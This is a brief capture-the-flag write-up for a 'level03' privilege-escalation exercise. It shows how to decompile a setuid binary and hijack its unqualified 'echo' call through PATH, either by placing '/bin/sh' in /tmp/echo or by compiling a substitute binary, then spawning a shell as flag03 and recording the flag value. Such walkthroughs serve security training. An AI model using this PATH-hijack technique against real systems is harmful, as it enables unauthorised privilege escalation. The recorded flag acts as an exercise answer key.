# level03

It is possible to run almost any executable with elevated privileges in this exercise, I chose sh as it permits pretty much anything

1. Decompile binary, see that it runs as flag03
2. Exploit env vars usage by changing $PATH
3. Create an exploit binary to be executed by the original binary
4. Execute original binary and retrieve flag

in kali: scp executable from target machine

in kali: `/opt/retdec/bin/retdec-decompiler.py level03`

OPTION 1:

 `PATH=/tmp:$PATH`

 `echo /bin/sh > /tmp/echo`

 `chmod +x /tmp/echo`

 `./level03`

 `whoami`

 `getflag`

 gives: qi0maab88jeaj46qoumi7maus

OPTION 2:

 `cd /tmp`

 `vim main.c`

 Copy-Paste exploit.c

 `gcc main.c -o echo`

 `~/level03`

  `whoami`

 `getflag`

 gives: qi0maab88jeaj46qoumi7maus